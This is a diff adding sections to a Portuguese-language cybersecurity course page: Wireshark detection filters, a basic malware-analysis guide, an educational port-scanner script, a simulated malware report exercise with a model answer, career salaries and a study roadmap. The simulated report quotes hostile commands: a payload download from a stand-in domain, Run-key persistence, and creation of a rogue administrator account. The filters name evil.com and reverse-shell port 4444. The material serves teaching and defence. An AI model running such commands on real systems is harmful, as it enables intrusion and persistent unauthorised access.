+    <div class="card-title"><span class="icon">🌐</span> Análise de Rede com Wireshark</div>
+    <p>
+      Wireshark captura pacotes de rede em tempo real e permite analisá-los camada por camada.
+      A maioria dos problemas de rede e muitos ataques deixam <span class="highlight">rastros visíveis</span>
+      no tráfego de rede.
+    </p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span class="lang">Captura com tcpdump + análise no Wireshark</span>
+    </div>
+    <pre><span class="comment"># Captura todos os pacotes da interface eth0 e salva em arquivo (para análise depois)</span>
+<span class="cmd">sudo tcpdump</span> -i eth0 -w captura.pcap
+
+<span class="comment"># Filtra no Wireshark (ou no tcpdump):</span>
+<span class="comment"># TCP SYN sem ACK — possível SYN scan (mapeamento de portas)</span>
+<span class="info">tcp.flags.syn == 1 and tcp.flags.ack == 0</span>
+
+<span class="comment"># DNS queries para domínios suspeitos</span>
+<span class="info">dns.qry.name contains "evil.com"</span>
+
+<span class="comment"># Pacotes HTTP com password no corpo</span>
+<span class="info">http.request.method == "POST" and http contains "password"</span>
+
+<span class="comment"># Tráfego para porta desconhecida de alto volume (possível C2 ou exfiltração)</span>
+<span class="info">tcp.port == 4444 and frame.len > 1000</span>  <span class="comment"># 4444 é porta comum de reverse shell</span></pre>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🔎</span> O que você procura em um PCAP (arquivo de captura):</div>
+    <ul style="margin:0.5rem 0 1rem;padding-left:1.5rem;color:var(--text2);">
+      <li><span class="highlight">Recon:</span> scans de porta, enumeração de serviços (SYN, ACK scans)</li>
+      <li><span class="highlight">C2 (Command & Control):</span> comunicação periódica com servidor externo conhecido como malicioso</li>
+      <li><span class="highlight">Exfiltração:</span> volume grande de dados saindo para IP desconhecido</li>
+      <li><span class="highlight">Clear-text credentials:</span> senhas em HTTP/FTP/SMTP sem criptografia</li>
+      <li><span class="highlight">DNS tunneling:</span> grandes consultas DNS (dados escondidos em subdomínios)</li>
+      <li><span class="highlight">Beaconing:</span> pings regulares e previsíveis para IP específico (máquina infectada "avisando" o atacante)</li>
+    </ul>
+  </div>
+
+  <!-- Malware Analysis Básico -->
+  <div class="card" style="margin-top:1.5rem;">
+    <div class="card-title"><span class="icon">🦠</span> Análise de Malware — Nível introdutório</div>
+    <p>
+      Análise de malware é a arte de entender o que um programa malicioso faz, sem Executá-lo no seu sistema
+      de produção. Dois abordagens:
+    </p>
+    <div style="display:flex;gap:1rem;margin-top:0.8rem;flex-wrap:wrap;">
+      <div style="flex:1;min-width:200px;background:rgba(56,189,248,0.05);border-radius:8px;padding:0.8rem;border:1px solid rgba(56,189,248,0.12);">
+        <strong style="color:var(--accent);">Estática:</strong> analisar o arquivo <span class="highlight">sem executá-lo</span>
+        — strings, assinaturas, estrutura, imports, hashes.
+        <span style="color:var(--text2);font-size:0.85rem;">Ex: openssl dgst -sha256 malware.exe</span>
+      </div>
+      <div style="flex:1;min-width:200px;background:rgba(251,191,36,0.05);border-radius:8px;padding:0.8rem;border:1px solid rgba(251,191,36,0.12);">
+        <strong style="color:var(--yellow);var(--text);">Dinâmica:</strong> executar em ambiente <span class="highlight">isolado</span>
+        (máquina virtual sandbox) e observar comportamento — redes, arquivos, registry.
+        <span style="color:var(--text2);font-size:0.85rem;">Ex: Cuckoo Sandbox, ANY.RUN, Hybrid Analysis</span>
+      </div>
+    </div>
+    <p>
+      <span class="highlight">Passo a passo básico de análise de malware (envolvimento):</span>
+    </p>
+    <ol class="step-list" style="margin-top:0.5rem;">
+      <li>Isolar o arquivo — nunca abrir no sistema host.</li>
+      <li>Verificar hash (SHA-256) e consultar bases de dados: VirusTotal, Hybrid Analysis, ANY.RUN.</li>
+      <li>Extrair strings: <code>strings malware.exe | less</code> — busca por IPs, URLs, comandos, mensagens de erro.</li>
+      <li>Ver imports/exports (PEview, Detect It Easy) — quais APIs do Windows o malware usa? (ex: RegSetValue, WinExec).</li>
+      <li>Rodar em sandbox (VM isolada) e monitorar: Wireshark (rede), Process Monitor (arquivos/registry), API Monitor.</li>
+      <li>Combinar evidências estática + dinâmica para reconstruir o que o malware faz.</li>
+    </ol>
+  </div>
+
+  <!-- Automação com Python -->
+  <div class="card" style="margin-top:1.5rem;">
+    <div class="card-title"><span class="icon">🐍</span> Automação de Segurança com Python</div>
+    <p>
+      Um bom profissional automatiza tarefas repetitivas. Script pequeno economiza horas.
+      Aqui, um scanner básico de portas + detector de vulnerabilities simples.
+    </p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span class="lang">port_scanner.py — educacional</span>
+    </div>
+    <pre><span class="comment">#!/usr/bin/env python3</span>
+<span class="comment">"""Scanner de portas simples para fins educacionais.</span>
+<span class="comment">Sempre use apenas em sistemas próprios ou com permissão."""</span>
+
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> concurrent.futures
+<span class="keyword">import</span> argparse
+<span class="keyword">from</span> datetime <span class="keyword">import</span> datetime
+
+<span class="keyword">def</span> <span class="cmd">scan_port</span>(host, port, timeout=<span class="flags">2</span>):
+    <span class="comment">"""Tenta conectar na porta — se conseguir, está aberta."""</span>
+    <span class="keyword">try</span>:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        result = sock.connect_ex((host, port))
+        sock.close()
+        <span class="keyword">if</span> result == <span class="flags">0</span>:
+            <span class="keyword">return</span> port, <span class="string">"OPEN"</span>
+        <span class="keyword">else</span>:
+            <span class="keyword">return</span> port, <span class="string">"CLOSED"</span>
+    <span class="keyword">except</span> socket.gaierror:
+        <span class="keyword">return</span> port, <span class="string">"ERROR (host inválido)"</span>
+    <span class="keyword">except</span> socket.timeout:
+        <span class="keyword">return</span> port, <span class="string">"FILTERED (timeout)"</span>
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        <span class="keyword">return</span> port, <span class="string">f"ERROR: {e}"</span>
+
+<span class="keyword">def</span> <span class="cmd">scan_ports</span>(host, start_port, end_port, max_workers=<span class="flags">50</span>):
+    <span class="comment">"""Escaneia portas em paralelo para ser mais rápido."""</span>
+    <span class="keyword">print</span>(f<span class="string">"\n🔍 Escaneando {host} — portas {start_port}-{end_port}\n"</span>)
+
+    open_ports = []
+    results = []
+
+    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) <span class="keyword">as</span> executor:
+        future_to_port = {
+            executor.submit(scan_port, host, port): port
+            <span class="keyword">for</span> port <span class="keyword">in</span> range(start_port, end_port + <span class="flags">1</span>)
+        }
+        <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(future_to_port):
+            port, status = future.result()
+            results.append((port, status))
+            <span class="keyword">if</span> status == <span class="string">"OPEN"</span>:
+                open_ports.append(port)
+
+    <span class="comment"># Ordena por número da porta</span>
+    results.sort(key=lambda x: x[<span class="flags">0</span>])
+
+    <span class="keyword">for</span> port, status <span class="keyword">in</span> results:
+        marker = <span class="string">"🔴"</span> <span class="keyword">if</span> status == <span class="string">"OPEN"</span> <span class="keyword">else</span> <span class="string">"⚪"</span>
+        <span class="keyword">print</span>(f<span class="string">"  {marker} Porta {port:5d} → {status}"</span>)
+
+    <span class="keyword">print</span>(f<span class="string">"\n📊 Resumo: {len(open_ports)} porta(s) aberta(s) encontrada(s)"</span>)
+    <span class="keyword">if</span> open_ports:
+        <span class="keyword">print</span>(f<span class="string">   Portas: {', '.join(map(str, sorted(open_ports)))}"</span>)
+    <span class="keyword">return</span> open_ports
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    parser = argparse.ArgumentParser(description=<span class="string">"Scanner de portas educacional"</span>)
+    parser.add_argument(<span class="string">"host"</span>, help=<span class="string">"Host ou IP alvo"</span>)
+    parser.add_argument(<span class="string">"-s"</span>, <span class="string">"--start"</span>, type=int, default=<span class="flags">1</span>, help=<span class="string">"Porta inicial (default 1)"</span>)
+    parser.add_argument(<span class="string">"-e"</span>, <span class="string">"--end"</span>, type=int, default=<span class="flags">1024</span>, help=<span class="string">"Porta final (default 1024)"</span>)
+    args = parser.parse_args()
+
+    <span class="keyword">try</span>:
+        <span class="comment"># Resolver nome para IP</span>
+        ip = socket.gethostbyname(args.host)
+        <span class="keyword">print</span>(f<span class="string">"🎯 Alvo: {args.host} → {ip}"</span>)
+        <span class="keyword">start</span> = datetime.now()
+        scan_ports(ip, args.start, args.end)
+        elapsed = datetime.now() - <span class="keyword">start</span>
+        <span class="keyword">print</span>(f<span class="string">"⏱️  Tempo: {elapsed}"</span>)
+    <span class="keyword">except</span> socket.gaierror:
+        <span class="keyword">print</span>(f<span class="string">"❌ Erro: não foi possível resolver '{args.host}'"</span>)</pre>
+  </div>
+
+  <div class="callout warning">
+    <strong>⚠️ Para rodar:</strong>
+    <code>python3 port_scanner.py localhost -s 1 -e 100</code> — scaneia sua própria máquina.
+    <span class="danger">Nunca use contra sistemas que não tem permissão.</span>
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-hard">Exercício 07 — Difícil</span>
+    <h3>Exercício: Análise de Malware Simulado</h3>
+    <p class="desc">
+      Vou te dar um cenário de análise de malware. Você vai atuar como analista investigando
+      um arquivo suspeito — toda a informação vem de ferramentas padrão de análise.
+    </p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Ler os resultados de análise e tirar conclusões — como um analista real.</div>
+
+    <div style="background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:10px;padding:1.2rem;margin-bottom:1rem;">
+      <p style="color:var(--text);font-weight:700;margin-bottom:0.6rem;">📋 Relatório de Análise — malware_suspeito.exe</p>
+
+      <div style="font-family:'Cascadia Code',monospace;font-size:0.87rem;line-height:1.6;color:var(--text);background:rgba(0,0,0,0.3);border-radius:6px;padding:0.8rem;">
+        <strong>1. Hash (SHA-256):</strong><br>
+        &nbsp;&nbsp;a1b2c3d4e5f6... (hash completo omitido para exercício)<br><br>
+
+        <strong>2. VirusTotal (primeira consulta):</strong><br>
+        &nbsp;&nbsp;• 37/70 engines detectaram como malicioso<br>
+        &nbsp;&nbsp;• Deteções: "Trojan", "Win32/Agent", "Heur.Trojan"<br>
+        &nbsp;&nbsp;• Submitido por: 3 usuários diferentes em 2025<br>
+        &nbsp;&nbsp;• Frequência de detecção: 52% (não unanimidade — pode ser falso positivo ou família nova)<br><br>
+
+        <strong>3. Strings extraídas (trechos relevantes):</strong><br>
+        &nbsp;&nbsp;• "192.168.1.100:8080"<br>
+        &nbsp;&nbsp;• "admin"<br>
+        &nbsp;&nbsp;• "password123"<br>
+        &nbsp;&nbsp;• "cmd.exe /c"<br>
+        &nbsp;&nbsp;• "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"<br>
+        &nbsp;&nbsp;• "svchost.exe -k netsvcs"<br>
+        &nbsp;&nbsp;• "temp_reg_key"<br>
+        &nbsp;&nbsp;• "https://update.malware-domain.xyz/payload.dll"<br><br>
+
+        <strong>4. Imports identificadas:</strong><br>
+        &nbsp;&nbsp;• WinExec, CreateProcess, ShellExecute (execução de comandos/processos)<br>
+        &nbsp;&nbsp;• InternetOpen, InternetOpenUrl, HttpSendRequest (comunicação HTTP)<br>
+        &nbsp;&nbsp;• RegSetValueEx, RegOpenKeyEx (modificação de registry)<br>
+        &nbsp;&nbsp;• CreateFile, WriteFile, DeleteFile (manipulação de arquivos)<br>
+        &nbsp;&nbsp;• GetTickCount, QueryPerformanceCounter (eventuais verificações de tempo/anti-debug)<br><br>
+
+        <strong>5. Comportamento na sandbox (VM isolada):</strong><br>
+        &nbsp;&nbsp;• Ao ser executado, cria: %APPDATA%\Microsoft\tmp_reg_key.exe<br>
+        &nbsp;&nbsp;• Adiciona entrada no registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;valor "winupdate" = "%APPDATA%\Microsoft\tmp_reg_key.exe"<br>
+        &nbsp;&nbsp;• Conecta para 192.168.1.100:8080 (IP interno — estranho para malware, sugere testadores ou staging)<br>
+        &nbsp;&nbsp;• Tenta baixar: https://update.malware-domain.xyz/payload.dll<br>
+        &nbsp;&nbsp;• Executa: cmd.exe /c "net user atacante Senha123! /add" + "net localgroup Administradores atacante /add"<br>
+        &nbsp;&nbsp;• Cria novo usuário "atacante" e o adiciona ao grupo de administradores<br>
+      </div>
+    </div>
+
+    <ol class="step-list">
+      <li>Qual a confiança do hash? O malware é único ou já conhecido?</li>
+      <li>Pelas strings e imports, que <span class="highlight">capacidades</span> esse malware tem?</li>
+      <li>Qual o comportamento mais preocupante (alta gravidade)?</li>
+      <li>Qual astratégia de defesa para detectar/prevenir esse malware?</li>
+      <li>Se você fosse responder a este incidente, quais seriam seus 3 primeiros passos?</li>
+    </ol>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar resposta modelo</div>
+    <div class="solution-content"><span class="comment">
+1. Hash e confiança:
+   - 37/70 engines detectam como malware — indicação moderada-baixa.
+   - "Trojan" e "Win32/Agent" são classificações genéricas.
+   - 52% de detecção não é alto — pode ser um malware relativamente novo ou
+     uma variante modificada para evadir detecção.
+   - Recomendação: consultar bases addicionais (Hybrid Analysis, ANY.RUN, MalwareBazaar)
+     e analisar manualmente.
+
+2. Capacidades (pelas strings e imports):
+   - Persistência via registry (Run key) — sobrevive ao reboot.
+   - Comunicação HTTP (baixar DLL adicional) — modular, pode baixar mais componentes.
+   - Criação de processo (cmd.exe) — executar comandos no sistema.
+   - Modificação de registry para execução automática.
+   - Manipulação de arquivos (cria, executa, deletar?).
+   - Possível anti-debug (GetTickCount) — tentativa de detectar sandbox.
+
+3. Comportamento mais preocupante:
+   - Criação de usuário "atacante" e adição ao grupo de Administradores.
+     Isso é <span class="danger">elevação de privilégio e persistência do atacante</span>.
+   - Se executado com privilégios de admin, o atacante ganha controle total do sistema.
+   - Baixa de DLL adicional — pode ter funcionalidade adicional não vista na análise inicial.
+
+4. Defesas:
+   - Antivirus/EDR com detecção comportamental (não só signature).
+   - Monitorar criação de usuários não autorizados (alarme se "net user X /add" for executado).
+   - Monitorar alterações de registry no Run key.
+   - Bloquear comunicação com domínios/IPs conhecidos como maliciosos (lista de bloqueio).
+   - Segmentação de rede: restringir acesso à internet para esta máquina se não necessário.
+   - Políticas de aplicação: usar application control (AppLocker/WDAC) para impedir execução de binaries não autorizados.
+
+5. Primeiros passos de resposta a incidente:
+   - ISOLAR a máquina da rede (prevenir propagação e comunicação com C2).
+   - PRESERVAR evidências (dump de memória, imagem do disco, logs, o arquivo malware em questão).
+   - IDENTIFICAR escopo: outras máquinas foram infectadas? O atacante criou contas em outras?
+   - MUDAR senhas de admin e serviços afetados.
+   - INVESTIGAR logs de rede para ver se houve comunicação com C2 (o IP 192.168.1.100 é interno — investigar se é máquina comprometida ou staging do atacante).
+   - NOTIFICAR equipe e executar plano de resposta (pode exigir especialistas).
+   - RECUPERAR a partir de backups limpos (se disponíveis) ou reconstruir.
+   - FAZER lições aprendidas e ajustar defesas.
+    </span></div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 7: CARREIRA — SALÁRIOS, CARGOS, DESAFIOS        -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="carreira">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(129,140,248,0.15);color:var(--accent2);border:1px solid rgba(129,140,248,0.3);">07</div>
+    <h2>Carreira — Salários, Cargos, Desafios e Realidade</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">💰</span> Salários no Brasil (2026 — estimativas de mercado)</div>
+    <p>
+      Os valores variam por região, empresa, senioridade e perfil técnico. São estimativas
+      baseadas em dados de mercado (Glassdoor, LinkedIn, Indeed, CryptoJobs, concursos).
+      <span class="warn">Valores em R$ por mês (salário bruto).</span>
+    </p>
+  </div>
+
+  <table class="salary-table">
+    <thead>
+      <tr>
+        <th>Nível</th>
+        <th>Faixa salarial (R$/mês)</th>
+        <th>Exemplos de cargo</th>
+        <th>Tempo típico para chegar</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Iniciante</strong></td>
+        <td class="salary entry">R$ 2.500 – R$ 5.000</td>
+        <td>Jr. Security Analyst, Jr. SOC Analyst, Analista deTI com foco em segurança, trainee</td>
+        <td>0–2 anos (estágio, curso, primeiros certificados)</td>
+      </tr>
+      <tr>
+        <td><strong>Plano de entrada</strong></td>
+        <td class="salary entry">R$ 4.000 – R$ 7.000</td>
+        <td>SOC Analyst, Security Analyst, Analista de vulnerabilidade, Jr. Pentester</td>
+        <td>1–3 anos (experiência real + certificados como Security+ ou CTFL)</td>
+      </tr>
+      <tr>
+        <td><strong> intermediário</strong></td>
+        <td class="salary mid">R$ 7.000 – R$ 15.000</td>
+        <td>Security Engineer, Pentester, Analista de resposta a incidentes, Threat Intel Analyst, Security Consultant</td>
+        <td>3–6 anos (projetos reais, certificados como eJPT, OSCP, CEH)</td>
+      </tr>
+      <tr>
+        <td><strong>Sênior</strong></td>
+        <td class="salary senior">R$ 15.000 – R$ 35.000+</td>
+        <td>Senior Security Engineer, Sr. Pentester, SOC Lead, Manager deSegurança, CISO (pequena/média empresa)</td>
+        <td>6–10+ anos (resultados comprovados, networking, especialização)</td>
+      </tr>
+      <tr>
+        <td><strong>Remoto / internacional</strong></td>
+        <td class="salary senior">US$ 3.000 – US$ 12.000+/mês (equivalente R$ 15K–60K+)</td>
+        <td>Engenheiro de segurança remoto para empresas EUA/europa, bug bounty full-time, researcher</td>
+        <td>Depende — pode ser rápido com português+inglês + portfólio forte</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="callout info">
+    <strong>📊 Para referência global:</strong>
+    Salários em segurança cibernética são <span class="highlight">inclina demais</span> comparados à média de TI.
+    No Brasil, mesmo entry-level para segurança paga mais que TI geral entry-level.
+    Profissionais com certificações reconocidas (OSCP, CISSP, GIAC) ou experiências
+    em CTFs/bug bounty podem acelerar bastante a curva salarial.
+  </div>
+
+  <!-- Cargos -->
+  <div class="card" style="margin-top:1.5rem;">
+    <div class="card-title"><span class="icon">🏷️</span> Principais Cargos e O que fazem</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:0.8rem;">
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">SOC Analyst</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Vigia da segurança. Monitora alerts, investiga incidentes iniciais, triagem de alarmes.
+          Primeira linha de defesa. Turnos 24/7 comuns em SOCs grandes.</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">Security Engineer</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Implementa e mantém controles de segurança: firewalls, IAM, SIEM, WAF, segmentação.
+          Constrói infra de segurança, não só monitora.</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">Pentester / Ethical Hacker</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Testa sistemas (com permissão) para encontrar vulnerabilidades antes dos maus.
+          Relata achados, faz relatórios técnicos, às vezes auxilia na correção.
+          Pode ser interno ou freelancer (bug bounty).</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">Resposta a Incidentes</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Quando algo acontece, investiga, contém, remove, reconstrói.
+          Analisa logs, memória, disco, rede. Muito pressure — incidentes são emergência.</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">Threat Intelligence</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Estuda quem ataca, como, e por quê. Coleta dados de feeds, dark web, Francs.
+          Produz intel para a equipe usar na defesa. Mais analítico/estratégico.</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">Security Auditor</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Audita conformidade: LGPD, ISO 27001, PCI-DSS, NIST, etc.
+          Verifica se processos e controles estão em conformidade com padrões.
+          Pode trabalhar em consultoria ou internamente.</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">Application Security</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Foca em segurança de software: code review, SAST/DAST, secure coding,
+          integração de segurança no pipeline (DevSecOps). Muito em demanda.</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <div style="color:var(--accent);font-weight:700;font-size:1.1rem;margin-bottom:0.3rem;">CISO</div>
+        <p style="color:var(--text2);font-size:0.9rem;">Chief Information Security Officer — líder da área de segurança.
+          Define estratégia, gerencia equipes, comunica risco para a diretoria.
+          Requer experiência sólida + comunicação + visão de negócio.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Desafios -->
+  <div class="card" style="margin-top:1.5rem;">
+    <div class="card-title"><span class="icon">⚡</span> Desafios da Carreira — Realidade honesta</div>
+    <p>A cybersecurity é uma área <span class="highlight">emocionante</span>, mas tem desafios reais que você precisa saber:</p>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1rem;margin-top:1rem;">
+      <div style="background:rgba(248,113,113,0.06);border:1px solid rgba(248,113,113,0.15);border-radius:8px;padding:0.8rem;">
+        <strong style="color:var(--red);">Burnout e pressão</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">
+          Incidentes acontecem 24/7. SOCs têm turnos noturnos. Responder a incidente é emergência — stress alto.
+          Burnout é comum em profissionais menos experientes. Precisa de gestão de energia.
+        </p>
+      </div>
+      <div style="background:rgba(251,191,36,0.06);border:1px solid rgba(251,191,36,0.15);border-radius:8px;padding:0.8rem;">
+        <strong style="color:var(--yellow);">Aprendizado contínuo obrigatório</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">
+          O adversário não para de evoluir. Ferramentas, técnicas, ameaças mudam. Um profissional que para
+          de estudar fica obsoleto em 2–3 anos. Você precisa gostar de aprender o tempo todo.
+        </p>
+      </div>
+      <div style="background:rgba(56,189,248,0.06);border:1px solid rgba(56,189,248,0.15);border-radius:8px;padding:0.8rem;">
+        <strong style="color:var(--accent);">Responsabilidade e risco legal</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">
+          Se você testa sistemas, precisa de permissão WRITTEN. Se erra, pode haver consequências legais.
+          Profissionais de pentest e forense precisam de cuidado com cadeia de custódia de evidências.
+        </p>
+      </div>
+      <div style="background:rgba(52,211,153,0.06);border:1px solid rgba(52,211,153,0.15);border-radius:8px;padding:0.8rem;">
+        <strong style="color:var(--green);">Falta de profissionais qualificados</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">
+          (Isso é positivo para você.) Há <span class="highlight">déficit global de profissionais</span>.
+          (ISC)² estima milhões de vagas abertas globalmente. Isso significa
+          <span class="highlight">oportunidades e salários attrativos</span> para quem se qualifica.
+        </p>
+      </div>
+      <div style="background:rgba(129,140,248,0.06);border:1px solid rgba(129,140,248,0.15);border-radius:8px;padding:0.8rem;">
+        <strong style="color:var(--accent2);">Ética e dupla mão</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">
+          Você sabe como explorar sistemas — o que cria responsabilidade ética constante.
+          O uso do conhecimento para fins ilegais ou antiéticos pode destruir a carreira.
+          Profissionais sérios se guiam por código de ética.
+        </p>
+      </div>
+      <div style="background:rgba(192,132,252,0.06);border:1px solid rgba(192,132,252,0.15);border-radius:8px;padding:0.8rem;">
+        <strong style="color:#c084fc;">Comunicação é tão importante quanto técnica</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">
+          Explicar risco para não técnicos (diretores, clientes), escrever relatórios claros,
+          defender budgets — são parte do trabalho sênior. Técnica pura não basta para avançar.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout success">
+    <strong>✅ O lado bom:</strong>
+    Cybersecurity oferece <span class="highlight">intelectualmente estimulante</span>,
+    impacto real (você protege pessoas e empresas), salários competitivos, demanda alta,
+    possibilidade de trabalho remoto internacional, e uma comunidade
+    <span class="highlight">colaborativa</span> (CTFs, open-source, bug bounties, conferências).
+    Se você gosta de resolver puzzles, entender como as coisas funcionam, e tem curiosidade,
+    é uma carreira <span class="highlight">excelente</span>.
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 8: ROTEIRO DE ESTUDOS — DO ZERO AO AVANÇADO  -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="roadmap">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(52,211,153,0.15);color:var(--green);border:1px solid rgba(52,211,153,0.3);">08</div>
+    <h2>Roteiro de Estudos — Passo a Passo</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🗺️</span> Como ir do zero ao profissional</div>
+    <p>
+      Este roteiro é uma <span class="highlight">seqüência recomendada</span>, não mandamento.
+      Ajuste à sua realidade (tempo disponível, recursos, objetivos).
+      <span class="highlight">O mais importante: comece hoje</span> — perfeito é inimigo do bom.
+    </p>
+  </div>
+
+  <div class="roadmap">
+    <div class="roadmap-step" style="border-left:3px solid var(--green);padding-left:1.2rem;">
+      <div style="flex:1;">
+        <h4>Fundamentos de TI (1–3 meses)</h4>
+        <p>Redes (TCP/IP, DNS, HTTP, ports), sistemas operacionais (Linux básico, Windows), computação básica.</p>
+        <div class="step-time">Livros: "Redes de Computadores" (Tanenbaum) • Linux: curso gratuito + prática no terminal</div>
+      </div>
+    </div>
+    <div class="roadmap-step" style="border-left:3px solid var(--accent);padding-left:1.2rem;">
+      <div style="flex:1;">
+        <h4>Conceitos de Segurança (1–2 meses)</h4>
+        <p>Tríade CIA, criptografia básica, autenticação/MFA, gestão de vulnerabilidades, ameaças comuns (phishing, malware, etc.).</p>
+        <div class="step-time">Refresh: "Cybersecurity 101" (livros/cursos introdutórios) • Compreenda a lógica, não apenas memorize</div>
+      </div>
+    </div>
+    <div class="roadmap-step" style="border-left:3px solid var(--yellow);padding-left:1.2rem;">
+      <div style="flex:1;">
+        <h4>Ferramentas Básicas (2–3 meses)</h4>
+        <p>Nmap, Wireshark, Burp Suite Community, Linux CLI. Pratique em ambientes próprios (VM, laboratório).</p>
+        <div class="step-time">CTFs iniciantes, HackTheBox Starting Point, TryHackMe (trilhas gratuitas)</div>
+      </div>
+    </div>
+    <div class="roadmap-step" style="border-left:3px solid var(--orange);padding-left:1.2rem;">
+      <div style="flex:1;">
+        <h4>Primeiros Certificados (3–6 meses)</h4>
+        <p>CompTIA Security+ (conceitos, bom para resumir conhecimento) → depois eJPT (prática de pentest) ou SC-200 (SOC).</p>
+        <div class="step-time">Certificados de entrada não substituem experiência — são porta de entrada para entrevistas</div>
+      </div>
+    </div>
+    <div class="roadmap-step" style="border-left:3px solid var(--red);padding-left:1.2rem;">
+      <div style="flex:1;">
+        <h4>Prática Profunda (6–12 meses)</h4>
+        <p>TryHackMe intermediate → HackTheBox (máquinas fáciles→ médias) → OWASP Juice Shop → laboratório próprio (VulnHub).</p>
+        <div class="step-time">Construa portfólio: write-ups de CTFs, scripts próprios, labs, blog técnico</div>
+      </div>
+    </div>
+    <div class="roadmap-step" style="border-left:3px solid var(--accent2);padding-left:1.2rem;">
+      <div style="flex:1;">
+        <h4>Especialização (1–2 anos+)</h4>
+        <p>Escolha foco: pentest (OSCP, eWPT), blue team (SC-200, BTL1, GCIH), forense (GCFA, CFCE), app sec (CSSLP), etc.</p>
+        <div class="step-time">Profundice em 1–2 áreas, não tente ser generalista puro — o mercado valoriza especialistas com base ampla</div>
+      </div>
+    </div>
+    <div class="roadmap-step" style="border-left:3px solid #c084fc;padding-left:1.2rem;">
+      <div style="flex:1;">
+        <h4>Experiência Real / Portfólio (contínuo)</h4>
+        <p>Estágio, trainee, primeiro emprego em TI, projetos freelance, bug bounty (comece com programas legítimos e com permissão), voluntariado em segurança.</p>
+        <div class="step-time">Networking: LinkedIn, conferências (BSides, DefCon Groups, OWASP chapters), comunidades online</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout info" style="margin-top:1rem;">
+    <strong>📌 Dica do profissional:</strong>
+    Não espere ter todos os certificados para começar a trabalhar.
+    Muitos entram via <span class="highlight">TI geral → especialização na empresa</span>.
+    Um analista deTI que mostra interesse e estuda segurança pode transicionar internamente.
+    <span class="highlight">Experiência + curiosidade + porteira de mostrar conhecimento</span> vence apenas certificados em muitas entrevistas.
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 9: RECURSOS — O QUE ESTUDAR                     -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="recursos">
+  <div class="section-header">
